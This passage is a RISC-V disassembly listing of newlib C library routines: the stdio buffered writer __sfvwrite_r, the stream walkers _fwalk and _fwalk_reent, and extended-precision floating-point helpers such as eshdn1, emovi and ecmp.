   12f82:	ec5e                	sd	s7,24(sp)
   12f84:	e862                	sd	s8,16(sp)
   12f86:	e466                	sd	s9,8(sp)
   12f88:	e06a                	sd	s10,0(sp)
   12f8a:	0087f713          	andi	a4,a5,8
   12f8e:	8a32                	mv	s4,a2
   12f90:	8aaa                	mv	s5,a0
   12f92:	842e                	mv	s0,a1
   12f94:	c325                	beqz	a4,12ff4 <__sfvwrite_r+0x8e>
   12f96:	6d98                	ld	a4,24(a1)
   12f98:	cf31                	beqz	a4,12ff4 <__sfvwrite_r+0x8e>
   12f9a:	0027f713          	andi	a4,a5,2
   12f9e:	000a3903          	ld	s2,0(s4)
   12fa2:	c735                	beqz	a4,1300e <__sfvwrite_r+0xa8>
   12fa4:	603c                	ld	a5,64(s0)
   12fa6:	780c                	ld	a1,48(s0)
   12fa8:	80000b37          	lui	s6,0x80000
   12fac:	4981                	li	s3,0
   12fae:	4481                	li	s1,0
   12fb0:	c00b4b13          	xori	s6,s6,-1024
   12fb4:	864e                	mv	a2,s3
   12fb6:	8556                	mv	a0,s5
   12fb8:	c885                	beqz	s1,12fe8 <__sfvwrite_r+0x82>
   12fba:	86a6                	mv	a3,s1
   12fbc:	009b7363          	bgeu	s6,s1,12fc2 <__sfvwrite_r+0x5c>
   12fc0:	86da                	mv	a3,s6
   12fc2:	2681                	sext.w	a3,a3
   12fc4:	9782                	jalr	a5
   12fc6:	14a05563          	blez	a0,13110 <__sfvwrite_r+0x1aa>
   12fca:	010a3783          	ld	a5,16(s4)
   12fce:	99aa                	add	s3,s3,a0
   12fd0:	8c89                	sub	s1,s1,a0
   12fd2:	40a78533          	sub	a0,a5,a0
   12fd6:	00aa3823          	sd	a0,16(s4)
   12fda:	10050763          	beqz	a0,130e8 <__sfvwrite_r+0x182>
   12fde:	603c                	ld	a5,64(s0)
   12fe0:	780c                	ld	a1,48(s0)
   12fe2:	864e                	mv	a2,s3
   12fe4:	8556                	mv	a0,s5
   12fe6:	f8f1                	bnez	s1,12fba <__sfvwrite_r+0x54>
   12fe8:	00093983          	ld	s3,0(s2)
   12fec:	00893483          	ld	s1,8(s2)
   12ff0:	0941                	addi	s2,s2,16
   12ff2:	b7c9                	j	12fb4 <__sfvwrite_r+0x4e>
   12ff4:	85a2                	mv	a1,s0
   12ff6:	8556                	mv	a0,s5
   12ff8:	e0cff0ef          	jal	ra,12604 <__swsetup_r>
   12ffc:	28051863          	bnez	a0,1328c <__sfvwrite_r+0x326>
   13000:	01045783          	lhu	a5,16(s0)
   13004:	000a3903          	ld	s2,0(s4)
   13008:	0027f713          	andi	a4,a5,2
   1300c:	ff41                	bnez	a4,12fa4 <__sfvwrite_r+0x3e>
   1300e:	0017f713          	andi	a4,a5,1
   13012:	eb35                	bnez	a4,13086 <__sfvwrite_r+0x120>
   13014:	4444                	lw	s1,12(s0)
   13016:	6008                	ld	a0,0(s0)
   13018:	80000b37          	lui	s6,0x80000
   1301c:	ffeb4b93          	xori	s7,s6,-2
   13020:	4c01                	li	s8,0
   13022:	4981                	li	s3,0
   13024:	fffb4b13          	not	s6,s6
   13028:	8ca6                	mv	s9,s1
   1302a:	04098863          	beqz	s3,1307a <__sfvwrite_r+0x114>
   1302e:	2007f713          	andi	a4,a5,512
   13032:	12070a63          	beqz	a4,13166 <__sfvwrite_r+0x200>
   13036:	8d26                	mv	s10,s1
   13038:	1899f763          	bgeu	s3,s1,131c6 <__sfvwrite_r+0x260>
   1303c:	8cce                	mv	s9,s3
   1303e:	8d4e                	mv	s10,s3
   13040:	866a                	mv	a2,s10
   13042:	85e2                	mv	a1,s8
   13044:	5b3020ef          	jal	ra,15df6 <memmove>
   13048:	4458                	lw	a4,12(s0)
   1304a:	601c                	ld	a5,0(s0)
   1304c:	84ce                	mv	s1,s3
   1304e:	41970cbb          	subw	s9,a4,s9
   13052:	97ea                	add	a5,a5,s10
   13054:	01942623          	sw	s9,12(s0)
   13058:	e01c                	sd	a5,0(s0)
   1305a:	4981                	li	s3,0
   1305c:	010a3603          	ld	a2,16(s4)
   13060:	9c26                	add	s8,s8,s1
   13062:	409604b3          	sub	s1,a2,s1
   13066:	009a3823          	sd	s1,16(s4)
   1306a:	ccbd                	beqz	s1,130e8 <__sfvwrite_r+0x182>
   1306c:	4444                	lw	s1,12(s0)
   1306e:	6008                	ld	a0,0(s0)
   13070:	01045783          	lhu	a5,16(s0)
   13074:	8ca6                	mv	s9,s1
   13076:	fa099ce3          	bnez	s3,1302e <__sfvwrite_r+0xc8>
   1307a:	00093c03          	ld	s8,0(s2)
   1307e:	00893983          	ld	s3,8(s2)
   13082:	0941                	addi	s2,s2,16
   13084:	b755                	j	13028 <__sfvwrite_r+0xc2>
   13086:	4981                	li	s3,0
   13088:	4501                	li	a0,0
   1308a:	4c81                	li	s9,0
   1308c:	4c01                	li	s8,0
   1308e:	080c0b63          	beqz	s8,13124 <__sfvwrite_r+0x1be>
   13092:	c145                	beqz	a0,13132 <__sfvwrite_r+0x1cc>
   13094:	8bce                	mv	s7,s3
   13096:	013c7363          	bgeu	s8,s3,1309c <__sfvwrite_r+0x136>
   1309a:	8be2                	mv	s7,s8
   1309c:	6008                	ld	a0,0(s0)
   1309e:	6c1c                	ld	a5,24(s0)
   130a0:	5014                	lw	a3,32(s0)
   130a2:	84de                	mv	s1,s7
   130a4:	00a7f763          	bgeu	a5,a0,130b2 <__sfvwrite_r+0x14c>
   130a8:	445c                	lw	a5,12(s0)
   130aa:	00d78b3b          	addw	s6,a5,a3
   130ae:	097b4d63          	blt	s6,s7,13148 <__sfvwrite_r+0x1e2>
   130b2:	18dbc463          	blt	s7,a3,1323a <__sfvwrite_r+0x2d4>
   130b6:	603c                	ld	a5,64(s0)
   130b8:	780c                	ld	a1,48(s0)
   130ba:	8666                	mv	a2,s9
   130bc:	8556                	mv	a0,s5
   130be:	9782                	jalr	a5
   130c0:	84aa                	mv	s1,a0
   130c2:	04a05763          	blez	a0,13110 <__sfvwrite_r+0x1aa>
   130c6:	0005079b          	sext.w	a5,a0
   130ca:	40f989bb          	subw	s3,s3,a5
   130ce:	4505                	li	a0,1
   130d0:	02098b63          	beqz	s3,13106 <__sfvwrite_r+0x1a0>
   130d4:	010a3783          	ld	a5,16(s4)
   130d8:	9ca6                	add	s9,s9,s1
   130da:	409c0c33          	sub	s8,s8,s1
   130de:	409784b3          	sub	s1,a5,s1
   130e2:	009a3823          	sd	s1,16(s4)
   130e6:	f4c5                	bnez	s1,1308e <__sfvwrite_r+0x128>
   130e8:	4501                	li	a0,0
   130ea:	60e6                	ld	ra,88(sp)
   130ec:	6446                	ld	s0,80(sp)
   130ee:	64a6                	ld	s1,72(sp)
   130f0:	6906                	ld	s2,64(sp)
   130f2:	79e2                	ld	s3,56(sp)
   130f4:	7a42                	ld	s4,48(sp)
   130f6:	7aa2                	ld	s5,40(sp)
   130f8:	7b02                	ld	s6,32(sp)
   130fa:	6be2                	ld	s7,24(sp)
   130fc:	6c42                	ld	s8,16(sp)
   130fe:	6ca2                	ld	s9,8(sp)
   13100:	6d02                	ld	s10,0(sp)
   13102:	6125                	addi	sp,sp,96
   13104:	8082                	ret
   13106:	85a2                	mv	a1,s0
   13108:	8556                	mv	a0,s5
   1310a:	845ff0ef          	jal	ra,1294e <_fflush_r>
   1310e:	d179                	beqz	a0,130d4 <__sfvwrite_r+0x16e>
   13110:	01041783          	lh	a5,16(s0)
   13114:	0407e793          	ori	a5,a5,64
   13118:	00f41823          	sh	a5,16(s0)
   1311c:	557d                	li	a0,-1
   1311e:	b7f1                	j	130ea <__sfvwrite_r+0x184>
   13120:	4501                	li	a0,0
   13122:	8082                	ret
   13124:	00893c03          	ld	s8,8(s2)
   13128:	00093c83          	ld	s9,0(s2)
   1312c:	0941                	addi	s2,s2,16
   1312e:	fe0c0be3          	beqz	s8,13124 <__sfvwrite_r+0x1be>
   13132:	8662                	mv	a2,s8
   13134:	45a9                	li	a1,10
   13136:	8566                	mv	a0,s9
   13138:	343020ef          	jal	ra,15c7a <memchr>
   1313c:	12050f63          	beqz	a0,1327a <__sfvwrite_r+0x314>
   13140:	0505                	addi	a0,a0,1
   13142:	419509bb          	subw	s3,a0,s9
   13146:	b7b9                	j	13094 <__sfvwrite_r+0x12e>
   13148:	85e6                	mv	a1,s9
   1314a:	865a                	mv	a2,s6
   1314c:	4ab020ef          	jal	ra,15df6 <memmove>
   13150:	601c                	ld	a5,0(s0)
   13152:	85a2                	mv	a1,s0
   13154:	8556                	mv	a0,s5
   13156:	97da                	add	a5,a5,s6
   13158:	e01c                	sd	a5,0(s0)
   1315a:	ff4ff0ef          	jal	ra,1294e <_fflush_r>
   1315e:	f94d                	bnez	a0,13110 <__sfvwrite_r+0x1aa>
   13160:	87da                	mv	a5,s6
   13162:	84da                	mv	s1,s6
   13164:	b79d                	j	130ca <__sfvwrite_r+0x164>
   13166:	6c1c                	ld	a5,24(s0)
   13168:	02a7e863          	bltu	a5,a0,13198 <__sfvwrite_r+0x232>
   1316c:	501c                	lw	a5,32(s0)
   1316e:	02f9e563          	bltu	s3,a5,13198 <__sfvwrite_r+0x232>
   13172:	86ce                	mv	a3,s3
   13174:	013bf363          	bgeu	s7,s3,1317a <__sfvwrite_r+0x214>
   13178:	86da                	mv	a3,s6
   1317a:	02f6c6bb          	divw	a3,a3,a5
   1317e:	6038                	ld	a4,64(s0)
   13180:	780c                	ld	a1,48(s0)
   13182:	8662                	mv	a2,s8
   13184:	8556                	mv	a0,s5
   13186:	02f686bb          	mulw	a3,a3,a5
   1318a:	9702                	jalr	a4
   1318c:	84aa                	mv	s1,a0
   1318e:	f8a051e3          	blez	a0,13110 <__sfvwrite_r+0x1aa>
   13192:	409989b3          	sub	s3,s3,s1
   13196:	b5d9                	j	1305c <__sfvwrite_r+0xf6>
   13198:	0099f363          	bgeu	s3,s1,1319e <__sfvwrite_r+0x238>
   1319c:	84ce                	mv	s1,s3
   1319e:	8626                	mv	a2,s1
   131a0:	85e2                	mv	a1,s8
   131a2:	455020ef          	jal	ra,15df6 <memmove>
   131a6:	445c                	lw	a5,12(s0)
   131a8:	6018                	ld	a4,0(s0)
   131aa:	409786bb          	subw	a3,a5,s1
   131ae:	9726                	add	a4,a4,s1
   131b0:	c454                	sw	a3,12(s0)
   131b2:	e018                	sd	a4,0(s0)
   131b4:	fef9                	bnez	a3,13192 <__sfvwrite_r+0x22c>
   131b6:	85a2                	mv	a1,s0
   131b8:	8556                	mv	a0,s5
   131ba:	f94ff0ef          	jal	ra,1294e <_fflush_r>
   131be:	f929                	bnez	a0,13110 <__sfvwrite_r+0x1aa>
   131c0:	409989b3          	sub	s3,s3,s1
   131c4:	bd61                	j	1305c <__sfvwrite_r+0xf6>
   131c6:	4807f713          	andi	a4,a5,1152
   131ca:	e6070be3          	beqz	a4,13040 <__sfvwrite_r+0xda>
   131ce:	5004                	lw	s1,32(s0)
   131d0:	6c0c                	ld	a1,24(s0)
   131d2:	00198713          	addi	a4,s3,1
   131d6:	0014969b          	slliw	a3,s1,0x1
   131da:	9ea5                	addw	a3,a3,s1
   131dc:	8d0d                	sub	a0,a0,a1
   131de:	01f6d49b          	srliw	s1,a3,0x1f
   131e2:	00050d1b          	sext.w	s10,a0
   131e6:	9cb5                	addw	s1,s1,a3
   131e8:	4014d49b          	sraiw	s1,s1,0x1
   131ec:	976a                	add	a4,a4,s10
   131ee:	00e4f563          	bgeu	s1,a4,131f8 <__sfvwrite_r+0x292>
   131f2:	0019849b          	addiw	s1,s3,1
   131f6:	9ca9                	addw	s1,s1,a0
   131f8:	4007f793          	andi	a5,a5,1024
   131fc:	cfa9                	beqz	a5,13256 <__sfvwrite_r+0x2f0>
   131fe:	85a6                	mv	a1,s1
   13200:	8556                	mv	a0,s5
   13202:	408020ef          	jal	ra,1560a <_malloc_r>
   13206:	8caa                	mv	s9,a0
   13208:	cd25                	beqz	a0,13280 <__sfvwrite_r+0x31a>
   1320a:	6c0c                	ld	a1,24(s0)
   1320c:	866a                	mv	a2,s10
   1320e:	30b020ef          	jal	ra,15d18 <memcpy>
   13212:	01045783          	lhu	a5,16(s0)
   13216:	b7f7f793          	andi	a5,a5,-1153
   1321a:	0807e793          	ori	a5,a5,128
   1321e:	00f41823          	sh	a5,16(s0)
   13222:	01ac8533          	add	a0,s9,s10
   13226:	41a487bb          	subw	a5,s1,s10
   1322a:	01943c23          	sd	s9,24(s0)
   1322e:	e008                	sd	a0,0(s0)
   13230:	d004                	sw	s1,32(s0)
   13232:	8cce                	mv	s9,s3
   13234:	c45c                	sw	a5,12(s0)
   13236:	8d4e                	mv	s10,s3
   13238:	b521                	j	13040 <__sfvwrite_r+0xda>
   1323a:	865e                	mv	a2,s7
   1323c:	85e6                	mv	a1,s9
   1323e:	3b9020ef          	jal	ra,15df6 <memmove>
   13242:	4458                	lw	a4,12(s0)
   13244:	6010                	ld	a2,0(s0)
   13246:	000b879b          	sext.w	a5,s7
   1324a:	4177073b          	subw	a4,a4,s7
   1324e:	965e                	add	a2,a2,s7
   13250:	c458                	sw	a4,12(s0)
   13252:	e010                	sd	a2,0(s0)
   13254:	bd9d                	j	130ca <__sfvwrite_r+0x164>
   13256:	8626                	mv	a2,s1
   13258:	8556                	mv	a0,s5
   1325a:	7f4030ef          	jal	ra,16a4e <_realloc_r>
   1325e:	8caa                	mv	s9,a0
   13260:	f169                	bnez	a0,13222 <__sfvwrite_r+0x2bc>
   13262:	6c0c                	ld	a1,24(s0)
   13264:	8556                	mv	a0,s5
   13266:	ab1ff0ef          	jal	ra,12d16 <_free_r>
   1326a:	01041783          	lh	a5,16(s0)
   1326e:	4731                	li	a4,12
   13270:	00eaa023          	sw	a4,0(s5)
   13274:	f7f7f793          	andi	a5,a5,-129
   13278:	bd71                	j	13114 <__sfvwrite_r+0x1ae>
   1327a:	001c099b          	addiw	s3,s8,1
   1327e:	bd19                	j	13094 <__sfvwrite_r+0x12e>
   13280:	4731                	li	a4,12
   13282:	01041783          	lh	a5,16(s0)
   13286:	00eaa023          	sw	a4,0(s5)
   1328a:	b569                	j	13114 <__sfvwrite_r+0x1ae>
   1328c:	557d                	li	a0,-1
   1328e:	bdb1                	j	130ea <__sfvwrite_r+0x184>

0000000000013290 <_fwalk>:
   13290:	715d                	addi	sp,sp,-80
   13292:	f84a                	sd	s2,48(sp)
   13294:	f44e                	sd	s3,40(sp)
   13296:	f052                	sd	s4,32(sp)
   13298:	ec56                	sd	s5,24(sp)
   1329a:	e85a                	sd	s6,16(sp)
   1329c:	e45e                	sd	s7,8(sp)
   1329e:	e486                	sd	ra,72(sp)
   132a0:	e0a2                	sd	s0,64(sp)
   132a2:	fc26                	sd	s1,56(sp)
   132a4:	8a2e                	mv	s4,a1
   132a6:	52050913          	addi	s2,a0,1312
   132aa:	4b01                	li	s6,0
   132ac:	0b000a93          	li	s5,176
   132b0:	4b85                	li	s7,1
   132b2:	59fd                	li	s3,-1
   132b4:	00892783          	lw	a5,8(s2)
   132b8:	01093403          	ld	s0,16(s2)
   132bc:	02f05b63          	blez	a5,132f2 <_fwalk+0x62>
   132c0:	fff7849b          	addiw	s1,a5,-1
   132c4:	1482                	slli	s1,s1,0x20
   132c6:	9081                	srli	s1,s1,0x20
   132c8:	0485                	addi	s1,s1,1
   132ca:	035484b3          	mul	s1,s1,s5
   132ce:	94a2                	add	s1,s1,s0
   132d0:	01045783          	lhu	a5,16(s0)
   132d4:	00fbfb63          	bgeu	s7,a5,132ea <_fwalk+0x5a>
   132d8:	01241783          	lh	a5,18(s0)
   132dc:	8522                	mv	a0,s0
   132de:	01378663          	beq	a5,s3,132ea <_fwalk+0x5a>
   132e2:	9a02                	jalr	s4
   132e4:	01656b33          	or	s6,a0,s6
   132e8:	2b01                	sext.w	s6,s6
   132ea:	0b040413          	addi	s0,s0,176
   132ee:	fe8491e3          	bne	s1,s0,132d0 <_fwalk+0x40>
   132f2:	00093903          	ld	s2,0(s2)
   132f6:	fa091fe3          	bnez	s2,132b4 <_fwalk+0x24>
   132fa:	60a6                	ld	ra,72(sp)
   132fc:	6406                	ld	s0,64(sp)
   132fe:	74e2                	ld	s1,56(sp)
   13300:	7942                	ld	s2,48(sp)
   13302:	79a2                	ld	s3,40(sp)
   13304:	7a02                	ld	s4,32(sp)
   13306:	6ae2                	ld	s5,24(sp)
   13308:	6ba2                	ld	s7,8(sp)
   1330a:	855a                	mv	a0,s6
   1330c:	6b42                	ld	s6,16(sp)
   1330e:	6161                	addi	sp,sp,80
   13310:	8082                	ret

0000000000013312 <_fwalk_reent>:
   13312:	715d                	addi	sp,sp,-80
   13314:	f84a                	sd	s2,48(sp)
   13316:	f44e                	sd	s3,40(sp)
   13318:	f052                	sd	s4,32(sp)
   1331a:	ec56                	sd	s5,24(sp)
   1331c:	e85a                	sd	s6,16(sp)
   1331e:	e45e                	sd	s7,8(sp)
   13320:	e062                	sd	s8,0(sp)
   13322:	e486                	sd	ra,72(sp)
   13324:	e0a2                	sd	s0,64(sp)
   13326:	fc26                	sd	s1,56(sp)
   13328:	8c2a                	mv	s8,a0
   1332a:	8a2e                	mv	s4,a1
   1332c:	52050913          	addi	s2,a0,1312
   13330:	4b01                	li	s6,0
   13332:	0b000a93          	li	s5,176
   13336:	4b85                	li	s7,1
   13338:	59fd                	li	s3,-1
   1333a:	00892783          	lw	a5,8(s2)
   1333e:	01093403          	ld	s0,16(s2)
   13342:	02f05c63          	blez	a5,1337a <_fwalk_reent+0x68>
   13346:	fff7849b          	addiw	s1,a5,-1
   1334a:	1482                	slli	s1,s1,0x20
   1334c:	9081                	srli	s1,s1,0x20
   1334e:	0485                	addi	s1,s1,1
   13350:	035484b3          	mul	s1,s1,s5
   13354:	94a2                	add	s1,s1,s0
   13356:	01045783          	lhu	a5,16(s0)
   1335a:	00fbfc63          	bgeu	s7,a5,13372 <_fwalk_reent+0x60>
   1335e:	01241783          	lh	a5,18(s0)
   13362:	85a2                	mv	a1,s0
   13364:	8562                	mv	a0,s8
   13366:	01378663          	beq	a5,s3,13372 <_fwalk_reent+0x60>
   1336a:	9a02                	jalr	s4
   1336c:	01656b33          	or	s6,a0,s6
   13370:	2b01                	sext.w	s6,s6
   13372:	0b040413          	addi	s0,s0,176
   13376:	fe8490e3          	bne	s1,s0,13356 <_fwalk_reent+0x44>
   1337a:	00093903          	ld	s2,0(s2)
   1337e:	fa091ee3          	bnez	s2,1333a <_fwalk_reent+0x28>
   13382:	60a6                	ld	ra,72(sp)
   13384:	6406                	ld	s0,64(sp)
   13386:	74e2                	ld	s1,56(sp)
   13388:	7942                	ld	s2,48(sp)
   1338a:	79a2                	ld	s3,40(sp)
   1338c:	7a02                	ld	s4,32(sp)
   1338e:	6ae2                	ld	s5,24(sp)
   13390:	6ba2                	ld	s7,8(sp)
   13392:	6c02                	ld	s8,0(sp)
   13394:	855a                	mv	a0,s6
   13396:	6b42                	ld	s6,16(sp)
   13398:	6161                	addi	sp,sp,80
   1339a:	8082                	ret

000000000001339c <eshdn1>:
   1339c:	00450693          	addi	a3,a0,4
   133a0:	4781                	li	a5,0
   133a2:	0569                	addi	a0,a0,26
   133a4:	7861                	lui	a6,0xffff8
   133a6:	a811                	j	133ba <eshdn1+0x1e>
   133a8:	0017979b          	slliw	a5,a5,0x1
   133ac:	00e69023          	sh	a4,0(a3)
   133b0:	17c2                	slli	a5,a5,0x30
   133b2:	0689                	addi	a3,a3,2
   133b4:	93c1                	srli	a5,a5,0x30
   133b6:	02d50863          	beq	a0,a3,133e6 <eshdn1+0x4a>
   133ba:	0006d703          	lhu	a4,0(a3)
   133be:	00177613          	andi	a2,a4,1
   133c2:	c219                	beqz	a2,133c8 <eshdn1+0x2c>
   133c4:	0017e793          	ori	a5,a5,1
   133c8:	8305                	srli	a4,a4,0x1
   133ca:	0027f613          	andi	a2,a5,2
   133ce:	010765b3          	or	a1,a4,a6
   133d2:	da79                	beqz	a2,133a8 <eshdn1+0xc>
   133d4:	0017979b          	slliw	a5,a5,0x1
   133d8:	00b69023          	sh	a1,0(a3)
   133dc:	17c2                	slli	a5,a5,0x30
   133de:	0689                	addi	a3,a3,2
   133e0:	93c1                	srli	a5,a5,0x30
   133e2:	fcd51ce3          	bne	a0,a3,133ba <eshdn1+0x1e>
   133e6:	8082                	ret

00000000000133e8 <eshup1>:
   133e8:	01850693          	addi	a3,a0,24
   133ec:	4701                	li	a4,0
   133ee:	0509                	addi	a0,a0,2
   133f0:	a811                	j	13404 <eshup1+0x1c>
   133f2:	0017171b          	slliw	a4,a4,0x1
   133f6:	00f69023          	sh	a5,0(a3)
   133fa:	1742                	slli	a4,a4,0x30
   133fc:	16f9                	addi	a3,a3,-2
   133fe:	9341                	srli	a4,a4,0x30
   13400:	04d50063          	beq	a0,a3,13440 <eshup1+0x58>
   13404:	0006d783          	lhu	a5,0(a3)
   13408:	0107961b          	slliw	a2,a5,0x10
   1340c:	4106561b          	sraiw	a2,a2,0x10
   13410:	02061593          	slli	a1,a2,0x20
   13414:	0017979b          	slliw	a5,a5,0x1
   13418:	0005d463          	bgez	a1,13420 <eshup1+0x38>
   1341c:	00176713          	ori	a4,a4,1
   13420:	17c2                	slli	a5,a5,0x30
   13422:	93c1                	srli	a5,a5,0x30
   13424:	00277613          	andi	a2,a4,2
   13428:	0017e593          	ori	a1,a5,1
   1342c:	d279                	beqz	a2,133f2 <eshup1+0xa>
   1342e:	0017171b          	slliw	a4,a4,0x1
   13432:	00b69023          	sh	a1,0(a3)
   13436:	1742                	slli	a4,a4,0x30
   13438:	16f9                	addi	a3,a3,-2
   1343a:	9341                	srli	a4,a4,0x30
   1343c:	fcd514e3          	bne	a0,a3,13404 <eshup1+0x1c>
   13440:	8082                	ret

0000000000013442 <m16m>:
   13442:	1101                	addi	sp,sp,-32
   13444:	6e41                	lui	t3,0x10
   13446:	00011b23          	sh	zero,22(sp)
   1344a:	00011c23          	sh	zero,24(sp)
   1344e:	05e1                	addi	a1,a1,24
   13450:	083c                	addi	a5,sp,24
   13452:	00410813          	addi	a6,sp,4
   13456:	1e7d                	addi	t3,t3,-1
   13458:	0005d703          	lhu	a4,0(a1)
   1345c:	17f9                	addi	a5,a5,-2
   1345e:	15f9                	addi	a1,a1,-2
   13460:	e315                	bnez	a4,13484 <m16m+0x42>
   13462:	fe079f23          	sh	zero,-2(a5)
   13466:	ff0799e3          	bne	a5,a6,13458 <m16m+0x16>
   1346a:	0611                	addi	a2,a2,4
   1346c:	01a10693          	addi	a3,sp,26
   13470:	0007d703          	lhu	a4,0(a5)
   13474:	0789                	addi	a5,a5,2
   13476:	0609                	addi	a2,a2,2
   13478:	fee61f23          	sh	a4,-2(a2)
   1347c:	fed79ae3          	bne	a5,a3,13470 <m16m+0x2e>
   13480:	6105                	addi	sp,sp,32
   13482:	8082                	ret
   13484:	02a70733          	mul	a4,a4,a0
   13488:	0027d883          	lhu	a7,2(a5)
   1348c:	0007d303          	lhu	t1,0(a5)
   13490:	01c776b3          	and	a3,a4,t3
   13494:	96c6                	add	a3,a3,a7
   13496:	8341                	srli	a4,a4,0x10
   13498:	0106d893          	srli	a7,a3,0x10
   1349c:	971a                	add	a4,a4,t1
   1349e:	9746                	add	a4,a4,a7
   134a0:	01075893          	srli	a7,a4,0x10
   134a4:	00d79123          	sh	a3,2(a5)
   134a8:	00e79023          	sh	a4,0(a5)
   134ac:	ff179f23          	sh	a7,-2(a5)
   134b0:	fb0794e3          	bne	a5,a6,13458 <m16m+0x16>
   134b4:	bf5d                	j	1346a <m16m+0x28>

00000000000134b6 <eisnan.part.0>:
   134b6:	01250713          	addi	a4,a0,18
   134ba:	00055783          	lhu	a5,0(a0)
   134be:	0509                	addi	a0,a0,2
   134c0:	e789                	bnez	a5,134ca <eisnan.part.0+0x14>
   134c2:	fee51ce3          	bne	a0,a4,134ba <eisnan.part.0+0x4>
   134c6:	4501                	li	a0,0
   134c8:	8082                	ret
   134ca:	4505                	li	a0,1
   134cc:	8082                	ret

00000000000134ce <eneg>:
   134ce:	1101                	addi	sp,sp,-32
   134d0:	e426                	sd	s1,8(sp)
   134d2:	01255483          	lhu	s1,18(a0)
   134d6:	e822                	sd	s0,16(sp)
   134d8:	ec06                	sd	ra,24(sp)
   134da:	fff4c793          	not	a5,s1
   134de:	03179713          	slli	a4,a5,0x31
   134e2:	842a                	mv	s0,a0
   134e4:	e701                	bnez	a4,134ec <eneg+0x1e>
   134e6:	fd1ff0ef          	jal	ra,134b6 <eisnan.part.0>
   134ea:	e509                	bnez	a0,134f4 <eneg+0x26>
   134ec:	77e1                	lui	a5,0xffff8
   134ee:	8cbd                	xor	s1,s1,a5
   134f0:	00941923          	sh	s1,18(s0)
   134f4:	60e2                	ld	ra,24(sp)
   134f6:	6442                	ld	s0,16(sp)
   134f8:	64a2                	ld	s1,8(sp)
   134fa:	6105                	addi	sp,sp,32
   134fc:	8082                	ret

00000000000134fe <eisneg>:
   134fe:	1141                	addi	sp,sp,-16
   13500:	e022                	sd	s0,0(sp)
   13502:	01255403          	lhu	s0,18(a0)
   13506:	e406                	sd	ra,8(sp)
   13508:	fff44793          	not	a5,s0
   1350c:	03179713          	slli	a4,a5,0x31
   13510:	e711                	bnez	a4,1351c <eisneg+0x1e>
   13512:	fa5ff0ef          	jal	ra,134b6 <eisnan.part.0>
   13516:	87aa                	mv	a5,a0
   13518:	4501                	li	a0,0
   1351a:	e399                	bnez	a5,13520 <eisneg+0x22>
   1351c:	00f45513          	srli	a0,s0,0xf
   13520:	60a2                	ld	ra,8(sp)
   13522:	6402                	ld	s0,0(sp)
   13524:	0141                	addi	sp,sp,16
   13526:	8082                	ret

0000000000013528 <emovi>:
   13528:	01255783          	lhu	a5,18(a0)
   1352c:	7139                	addi	sp,sp,-64
   1352e:	f822                	sd	s0,48(sp)
   13530:	00f7d79b          	srliw	a5,a5,0xf
   13534:	f426                	sd	s1,40(sp)
   13536:	fc06                	sd	ra,56(sp)
   13538:	f04a                	sd	s2,32(sp)
   1353a:	ec4e                	sd	s3,24(sp)
   1353c:	40f007bb          	negw	a5,a5
   13540:	00f59023          	sh	a5,0(a1)
   13544:	01255783          	lhu	a5,18(a0)
   13548:	6721                	lui	a4,0x8
   1354a:	177d                	addi	a4,a4,-1
   1354c:	8ff9                	and	a5,a5,a4
   1354e:	00f59123          	sh	a5,2(a1)
   13552:	84aa                	mv	s1,a0
   13554:	01050413          	addi	s0,a0,16
   13558:	02e78863          	beq	a5,a4,13588 <emovi+0x60>
   1355c:	00658793          	addi	a5,a1,6
   13560:	00059223          	sh	zero,4(a1)
   13564:	1579                	addi	a0,a0,-2
   13566:	00045703          	lhu	a4,0(s0)
   1356a:	1479                	addi	s0,s0,-2
   1356c:	0789                	addi	a5,a5,2
   1356e:	fee79f23          	sh	a4,-2(a5) # ffffffffffff7ffe <__BSS_END__+0xfffffffffffc00fe>
   13572:	fe851ae3          	bne	a0,s0,13566 <emovi+0x3e>
   13576:	00059c23          	sh	zero,24(a1)
   1357a:	70e2                	ld	ra,56(sp)
   1357c:	7442                	ld	s0,48(sp)
   1357e:	74a2                	ld	s1,40(sp)
   13580:	7902                	ld	s2,32(sp)
   13582:	69e2                	ld	s3,24(sp)
   13584:	6121                	addi	sp,sp,64
   13586:	8082                	ret
   13588:	0007869b          	sext.w	a3,a5
   1358c:	01255783          	lhu	a5,18(a0)
   13590:	00458913          	addi	s2,a1,4
   13594:	8ff5                	and	a5,a5,a3
   13596:	02d79663          	bne	a5,a3,135c2 <emovi+0x9a>
   1359a:	e42e                	sd	a1,8(sp)
   1359c:	f1bff0ef          	jal	ra,134b6 <eisnan.part.0>
   135a0:	65a2                	ld	a1,8(sp)
   135a2:	c105                	beqz	a0,135c2 <emovi+0x9a>
   135a4:	00658793          	addi	a5,a1,6
   135a8:	00059223          	sh	zero,4(a1)
   135ac:	ffc48513          	addi	a0,s1,-4
   135b0:	00045703          	lhu	a4,0(s0)
   135b4:	1479                	addi	s0,s0,-2
   135b6:	0789                	addi	a5,a5,2
   135b8:	fee79f23          	sh	a4,-2(a5)
   135bc:	fe851ae3          	bne	a0,s0,135b0 <emovi+0x88>
   135c0:	bf6d                	j	1357a <emovi+0x52>
   135c2:	01a58993          	addi	s3,a1,26
   135c6:	0909                	addi	s2,s2,2
   135c8:	fe091f23          	sh	zero,-2(s2)
   135cc:	ff299de3          	bne	s3,s2,135c6 <emovi+0x9e>
   135d0:	70e2                	ld	ra,56(sp)
   135d2:	7442                	ld	s0,48(sp)
   135d4:	74a2                	ld	s1,40(sp)
   135d6:	7902                	ld	s2,32(sp)
   135d8:	69e2                	ld	s3,24(sp)
   135da:	6121                	addi	sp,sp,64
   135dc:	8082                	ret

00000000000135de <ecmp>:
   135de:	01255783          	lhu	a5,18(a0)
   135e2:	711d                	addi	sp,sp,-96
   135e4:	e8a2                	sd	s0,80(sp)
   135e6:	fff7c793          	not	a5,a5
   135ea:	e4a6                	sd	s1,72(sp)
   135ec:	ec86                	sd	ra,88(sp)
   135ee:	03179713          	slli	a4,a5,0x31
   135f2:	84aa                	mv	s1,a0
   135f4:	842e                	mv	s0,a1
   135f6:	e701                	bnez	a4,135fe <ecmp+0x20>
   135f8:	ebfff0ef          	jal	ra,134b6 <eisnan.part.0>
   135fc:	ed39                	bnez	a0,1365a <ecmp+0x7c>
   135fe:	01245783          	lhu	a5,18(s0)
   13602:	fff7c793          	not	a5,a5
   13606:	03179713          	slli	a4,a5,0x31
   1360a:	c721                	beqz	a4,13652 <ecmp+0x74>
   1360c:	858a                	mv	a1,sp
   1360e:	8526                	mv	a0,s1
   13610:	f19ff0ef          	jal	ra,13528 <emovi>
   13614:	100c                	addi	a1,sp,32
   13616:	8522                	mv	a0,s0
   13618:	f11ff0ef          	jal	ra,13528 <emovi>
